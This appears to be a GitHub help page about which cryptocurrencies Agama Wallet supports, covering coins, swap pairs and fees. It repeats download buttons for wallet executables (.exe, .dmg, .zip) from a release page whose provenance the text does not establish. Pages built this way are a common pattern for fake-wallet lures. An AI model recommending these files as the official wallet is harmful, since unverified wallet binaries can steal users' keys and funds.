[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Which Assets Agama Wallet Supports

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Agama Wallet's own asset data lists KMD, VRSC, BTC, LTC, ZEC, DOGE, BCH and DASH alongside CHIPS, GAME and ERC-20 tokens, summarised on the site as "30+". Monero is not on the list. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and the asset list determines what can be held and what can be swapped.

## You'll see this if

You are checking whether a coin can be stored or swapped before moving it, and the marketing figure and the actual list do not agree.

| Asset | On the site's list | Notes |
|---|---|---|
| KMD | Yes | Komodo's native coin |
| VRSC | Yes | Verus; a separate project |
| BTC | Yes | Deepest swap pair with KMD |
| LTC | Yes | Named among the most liquid pairs |
| ZEC | Yes | Transparent and shielded outputs differ |
| DOGE | Yes | UTXO chain |
| BCH | Yes | UTXO chain |
| DASH | Yes | UTXO chain |
| CHIPS, GAME | Yes | Komodo-ecosystem assets |
| ERC-20 tokens | Yes, per the site | Token support depends on the chain behind it |
| XMR (Monero) | No | Not in the site's asset data |

## Why it happens

A multi-asset wallet supports what its code implements, not what a category suggests. Each asset needs its own address format, transaction rules and, where swaps are involved, a counterparty market.

That explains the shape of the list. It is heavy on UTXO chains, because the wallet's accounting is output-based and those chains share the model. It includes Komodo-ecosystem assets because that is the wallet's home. It includes ERC-20 tokens through a different mechanism, since those live inside another chain's ledger rather than on their own.

Monero's absence is the clearest example of a limit rather than an oversight: it uses a different accounting and privacy model, and the site does not list it. A swap involving XMR is therefore not something this wallet can perform, whatever the search results suggest.

The "30+" figure is the maker's count. The named list is what can be checked.

## Fix

Before moving anything, confirm the asset is both supported and swappable.

1. **Check the asset against the list**, not against the category. "It is a UTXO coin" does not mean the wallet implements it.
2. **Check the mode.** Some assets are readable in SPV and Native differently; [Native vs SPV mode](https://github.com/agama-wallet/agama-wallet/blob/main/native-versus-spv-mode.md) covers the trade-off.
3. **Check the swap pair, not just the asset.** Holding an asset and being able to swap it are different capabilities.
4. **Check the fee asset.** A swap needs the chain's native coin for fees, so holding only a token is not enough.
5. **Do not send an unsupported asset to an address from this wallet.** It will not appear, and recovery depends on the sending chain.

If an asset is not listed, the honest answer is that this wallet does not support it, not that it might after an update, and no setting changes what the code implements or what a token list contains.

## If that did not work

If a supported asset shows zero, the cause is usually mode or sync rather than support: [zero balance after restoring](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md) separates them.

If an ERC-20 token does not appear, check whether the token contract is one the wallet reads; token lists are curated rather than universal.

If a swap pair has no counterparty, the asset is supported and the market is empty. [Atomic swap fees](https://github.com/agama-wallet/atomic-swaps/blob/main/what-a-trade-costs.md) explains why thin pairs cost more.

If you sent an unsupported asset, do not attempt to "add" it by editing wallet files. Recovery requires the sending chain's tools, and the address may not be one you can spend from.

## Prevention

- **Confirm before sending.** Address formats differ between chains and a wrong-chain send is not reversible.
- **Keep the native coin for fees.** A wallet full of tokens with no KMD or BTC cannot pay for a swap.
- **Do not treat "30+" as a list.** The named assets are the verifiable part.
- **Check pairs before trading.** [What an atomic swap is](https://github.com/agama-wallet/atomic-swaps/blob/main/exchange-without-an-intermediary.md) explains what a pair needs to exist.
- **Record which assets you hold where.** [Backing up an Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/backup-what-dat-covers.md) covers what a backup does and does not cover across assets.

## FAQ

### Does Agama Wallet support Monero?

No. XMR is not in the site's asset data, so holding or swapping it is not something this wallet can do.

### What does "30+" mean?

It is the maker's count of supported assets. The named list is what can be checked directly today, and it includes tokens whose support actually depends on another chain.

### What happens if I send a listed asset in the wrong mode?

Nothing destructive: the asset appears once the mode that can read it is active. The risk is the opposite case, where an unlisted asset is sent to an address the wallet shows but cannot spend from.

### Can I hold ERC-20 tokens?

The site lists ERC-20 support. Whether a specific token appears depends on the wallet's token handling, not on the standard alone.

### Why does the wallet list so many UTXO chains?

Because its accounting is output-based, so a chain with the same model needs an address format and transaction rules rather than a new engine. Account-based chains and tokens work differently, which is why ERC-20 support is described as a separate capability rather than another row in the same list.

### Can the asset list change without an update?

Token support can, because a token is read from another chain, while native coins require the wallet's own code. That is why a token appearing or disappearing is a different event from a chain being added.

### Are all listed assets swappable?

No. Being able to hold an asset and being able to swap it are separate capabilities, and a swap also needs a counterparty.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Agama Wallet: What It Is, and Which Agama You Are Looking At](https://github.com/agama-wallet/agama-wallet/blob/main/which-version-you-have.md)
- [KMD Coin: What Komodo's Native Asset Does](https://github.com/agama-wallet/agama-wallet/blob/main/what-kmd-does.md)
- [Native Mode vs SPV Mode in Agama Wallet](https://github.com/agama-wallet/agama-wallet/blob/main/native-versus-spv-mode.md)
- [Fees in Agama Wallet: Swap Fees and Network Fees](https://github.com/agama-wallet/agama-wallet/blob/main/swap-and-network-fees.md)
